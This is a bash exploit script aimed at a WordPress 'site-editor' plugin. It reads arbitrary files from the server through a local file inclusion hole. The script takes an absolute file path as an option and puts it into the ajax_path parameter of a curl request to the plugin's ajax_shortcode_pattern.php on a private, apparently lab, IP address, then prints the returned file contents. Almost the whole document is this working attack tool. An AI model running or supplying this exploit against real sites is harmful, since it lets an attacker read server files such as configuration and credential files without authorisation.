#!/bin/bash

function ctrl_c(){
  echo -e "\n\n [!] Leaving...\n"
  exit 1
}


# Ctrl+C
trap ctrl_c INT

declare -i parameter_counter=0

function fileRead(){
  filename=$1

  echo -e "\n[+] This is the content of the file $filename:\n"
  curl -s -X GET "http://192.168.129.128/WORDPRESSDIRECTORY/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=$filename"
}

function helpPanel(){
  echo -e "\n[i] Use:\n"
  echo -e "\th) Show this help panel"
  echo -e "\tf) Provide absolute path of the file to read\n"
  exit 0
}

while getopts "hf:" arg; do
  case $arg in
    h) ;;
    f) filename=$OPTARG; let parameter_counter+=1;;
  esac
done

if [ $parameter_counter -eq 1 ]; then
  fileRead $filename
else
  helpPanel
fi
